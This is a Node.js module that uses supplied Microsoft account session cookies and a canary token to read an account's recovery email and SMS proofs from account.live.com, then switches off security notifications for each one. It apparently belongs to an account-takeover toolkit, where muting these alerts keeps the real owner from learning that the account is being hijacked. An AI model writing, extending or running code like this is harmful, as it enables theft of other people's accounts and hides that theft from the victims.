const axios = require('axios');
const decode = require('./decode');
const fs = require('fs');  // Import the fs module for file operations

module.exports = async (amrp, amsc, apiCanary) => {
  try {

    const { data: html } = await axios({
      method: "GET",
      url: `https://account.live.com/proofs/Manage/additional?uaid=07876c46b7514e38b8c1196f84d73982`, 
      headers: {
        Cookie: `AMRPSSecAuth=${amrp}; amsc=${amsc};`,
      },
    });


    const emailProofsRegex = /"emailProofs":\s*(\[[^\]]*\])/;
    const smsProofsRegex = /"smsProofs":\s*(\[[^\]]*\])/;

    const emailMatch = html.match(emailProofsRegex);
    const smsMatch = html.match(smsProofsRegex);

    let sms = [];  // To store all SMS names
    let email = [];  // To store all Email names


    if (emailMatch) {
      const emailProofs = JSON.parse(emailMatch[1]);
      

      for (const proof of emailProofs) {
        const emailName = decode(proof.displayProofId); // URL Decode this

        const data = {
          proofDetails: [
            {
              name: emailName,  
              notificationEnabled: false, // Disable
              type: "Email",  
            }
          ],
          uiflvr: 1001,  
          uaid: '07876c46b7514e38b8c1196f84d73982',  
          scid: 100109,  
          hpgid: 201030,  
        };

        try {
          const response = await axios({
            method: "POST",
            url: "https://account.live.com/API/Proofs/SetUserNotificationState",
            headers: {
              Cookie: `AMRPSSecAuth=${amrp}; amsc=${amsc};`,
              canary: apiCanary,
            },
            data: data,
          });

          if (response.status === 200) {
            console.log(`Successfully disabled notification for email: ${emailName}`);
          } else {
            throw new Error(`Failed to disable notification for ${emailName}. Status: ${response.status}`);
          }
        } catch (error) {

          console.error(`Error disabling notification for email ${emailName}:`, error.message);
        }


        email.push(emailName);
      }
    }


    if (smsMatch) {
      const smsProofs = JSON.parse(smsMatch[1]);
      

      for (const proof of smsProofs) {
        const smsName = decode(proof.displayProofId); // URL DECODE

        const data = {
          proofDetails: [
            {
              name: smsName,  
              notificationEnabled: false,  // Disable
              type: "SMS",  
            }
          ],
          uiflvr: 1001,  
          uaid: '07876c46b7514e38b8c1196f84d73982',  
          scid: 100109,  
          hpgid: 201030,  
        };

        try {
          const response = await axios({
            method: "POST",
            url: "https://account.live.com/API/Proofs/SetUserNotificationState",
            headers: {
              Cookie: `AMRPSSecAuth=${amrp}; amsc=${amsc};`,
              canary: apiCanary,
            },
            data: data,
          });

          if (response.status === 200) {
            console.log(`Successfully disabled notification for SMS: ${smsName}`);
          } else {
            throw new Error(`Failed to disable notification for ${smsName}. Status: ${response.status}`);
          }
        } catch (error) {

          console.error(`Error disabling notification for SMS ${smsName}:`, error.message);
        }


        sms.push(smsName);
      }
    }


    const smsNames = sms.length > 0 ? sms.join(", ") : "None";
    const emailNames = email.length > 0 ? email.join(", ") : "None";


    return { smsNames, emailNames };

  } catch (error) {

    console.error("Error fetching or processing the proofs:", error.message);
    return { smsNames: "Failed to find", emailNames: "Failed to find" };  // Return "Failed to find" in case of failure
  }
};
